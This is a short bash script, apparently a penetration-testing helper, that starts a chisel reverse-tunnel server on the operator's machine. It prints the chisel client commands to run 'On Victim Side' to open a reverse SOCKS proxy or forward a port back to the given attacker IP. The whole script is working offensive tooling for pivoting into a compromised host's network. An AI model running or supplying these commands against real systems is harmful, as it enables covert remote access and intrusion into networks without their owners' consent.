#!/bin/bash

if [ "$#" -ne 1 ] || [ "$1" == "--version" ];
then
    echo "usage";
    echo "tunnel.sh IP";
    exit;
fi 

IP=$1;


echo "***** On Victim Side *****"
echo ""
echo "chisel_amd64.exe client $IP:8001 R:9001:socks"
echo ""
echo "**************************"

echo "***** On Victim Side (Specific port)*****"
echo ""
echo "./chisel client $IP:8001 R:8000:127.0.0.1:8000"
echo ""
echo "**************************"


chisel server --reverse --port 8001
